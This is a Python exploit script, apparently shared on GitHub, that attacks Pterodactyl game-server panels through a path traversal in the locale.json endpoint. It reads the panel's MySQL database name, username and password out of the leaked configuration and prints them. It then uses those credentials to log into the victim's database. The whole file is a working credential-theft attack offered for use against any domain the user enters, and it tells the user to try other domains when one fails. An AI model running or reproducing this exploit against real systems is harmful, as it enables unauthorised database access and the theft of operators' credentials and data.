import requests
import mysql.connector
from mysql.connector import Error 
import colorama
import socket 
colorama.init(autoreset=True)

print("""
      尸七🝗尺ㄖ千ㄩ⼕长🝗尺
            github.com/lucadado
      """)
asd = input(f"{colorama.Fore.LIGHTRED_EX}Enter the panel (e.g., panel.example.com): {colorama.Fore.RESET}")
try:
    diocane = f"https://{asd}/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
    if requests.get(diocane).status_code == 200:
        testxd = requests.get(diocane).json()
        database = testxd["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("database", "N/A")
        username = testxd["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("username", "N/A")
        password = testxd["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("password", "N/A")
        host = socket.gethostbyname(asd)
        print(f"{colorama.Fore.GREEN}Panel found!"
            f"\n{colorama.Fore.GREEN}Host: {colorama.Fore.RESET}{host}"
            f"\n{colorama.Fore.GREEN}Database: {colorama.Fore.RESET}{database}"
            f"\n{colorama.Fore.GREEN}Username: {colorama.Fore.RESET}{username}"
            f"\n{colorama.Fore.GREEN}Password: {colorama.Fore.RESET}{password}")
        print(f"{colorama.Fore.GREEN}Attempting to connect to the database...")
        try:
            connection = mysql.connector.connect(
                host=host,
                database=database,
                user=username,
                password=password
            )
            if connection.is_connected():
                db_info = connection.get_server_info()
                print(f"{colorama.Fore.GREEN}Connected to MySQL Server version {db_info}")
        except Error as e:
            print(f"{colorama.Fore.RED}Error while connecting to MySQL: {e}")
except:
    print(f"{colorama.Fore.RED}Not vulnerable, try another domain.")